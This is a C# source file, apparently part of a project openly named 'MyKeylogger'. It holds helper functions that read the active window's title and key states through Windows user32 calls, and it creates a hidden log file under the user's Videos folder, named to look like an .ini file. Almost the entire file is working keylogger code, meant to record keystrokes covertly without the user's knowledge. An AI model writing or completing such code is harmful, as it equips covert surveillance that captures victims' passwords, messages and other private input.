using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace MyKeylogger
{
    public static class Functions
    {
        [DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int cch);

        [DllImport("user32.dll", EntryPoint = "GetWindowTextLength", SetLastError = true)]
        internal static extern int GetWindowTextLength(IntPtr hwnd);

        [DllImport("User32.dll")]
        internal static extern short GetKeyState(Keys nVirtualKey);

        public static bool IsToggled(this Keys key)
        {
            return GetKeyState(key) == 0x1;
        }

        public static bool IsKeyPressed(this Keys key)
        {
            var result = GetKeyState(key);

            switch(result)
            {
                case 0: return false;
                case 1: return false;
                default: return true;
            }
        }

        /// <summary>
        /// Function to solve string size errors when getting the name of the window
        /// </summary>
        /// <param name="hWnd"></param>
        /// <returns></returns>
        public static string GetText(IntPtr hWnd)
        {
            // Allocate correct string length first
            int length = GetWindowTextLength(hWnd);
            StringBuilder sb = new StringBuilder(length + 1);
            GetWindowText(hWnd, sb, sb.Capacity);
            return sb.ToString();
        }

        /// <summary>
        /// Get the text name of the active window
        /// </summary>
        /// <returns></returns>
        public static string GetActiveWindowText()
        {
            var handle = GetForegroundWindow();
            var sb_str = GetText(handle);
            StringBuilder sb = new StringBuilder();
            sb.Append(sb_str);
            GetWindowText(handle, sb, 1000);
            return sb.Length == 0 ? "UnNamed Window" : sb.ToString();
        }

        /// <summary>
        /// Function to create a new keylog file
        /// </summary>
        public static void CreateFile()
        {
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\ks\\myKeylogger.ini")) return;
            File.Create(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\ks\\myKeylogger.ini").Dispose();
            File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\ks\\myKeylogger.ini", FileAttributes.Hidden);
        }

        /// <summary>
        /// Function to delete the keylog file
        /// </summary>
        public static void DeleteFile()
        {
            FileInfo file = new FileInfo(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\ks\\myKeylogger.ini");
            if (file.Exists)
            {
                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\ks\\myKeylogger.ini");
            }
            CreateFile();
        }

        }
    }
